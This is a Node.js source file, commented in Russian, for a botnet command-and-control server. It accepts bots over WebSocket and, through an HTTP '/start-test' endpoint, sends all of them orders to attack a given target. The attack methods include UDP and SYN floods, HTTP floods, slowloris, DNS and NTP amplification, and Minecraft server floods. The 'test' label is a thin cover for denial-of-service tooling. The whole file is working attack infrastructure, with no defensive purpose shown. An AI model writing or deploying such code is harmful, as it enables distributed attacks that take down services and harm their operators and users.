const express = require('express');
const WebSocket = require('ws');
const app = express();
const wss = new WebSocket.Server({ port: 3000 }); // Замените порт при необходимости

const bots = new Set();
const availableMethods = [
  'udp_flood', 'tcp_syn_flood', 'http_flood', 'mc_login_flood', 'mc_ping_flood',
  'ovh_tcp', 'slowloris', 'dns_amplification', 'ntp_amplification', 'botjoiner'
];

wss.on('connection', (ws) => {
  bots.add(ws);
  console.log('Новый бот подключен');

  ws.on('message', (message) => {
    console.log('Получено сообщение от бота:', message);
  });

  ws.on('close', () => {
    bots.delete(ws);
    console.log('Бот отключен');
  });
});

app.use(express.json());

app.post('/start-test', (req, res) => {
  const { target, method, duration, threads, options } = req.body;
  if (!availableMethods.includes(method)) {
    return res.status(400).json({ error: 'Invalid method' });
  }
  console.log(`Начало теста: ${method} на ${target} в течение ${duration} секунд с ${threads} потоками`);
  
  bots.forEach((bot) => {
    bot.send(JSON.stringify({ action: 'start', target, method, duration, threads, options }));
  });

  res.json({ status: 'Тест начат' });
});

app.get('/methods', (req, res) => {
  res.json({ methods: availableMethods });
});

const PORT = process.env.PORT || 20702;
app.listen(PORT, () => console.log(`Сервер управления запущен на порту ${PORT}`));
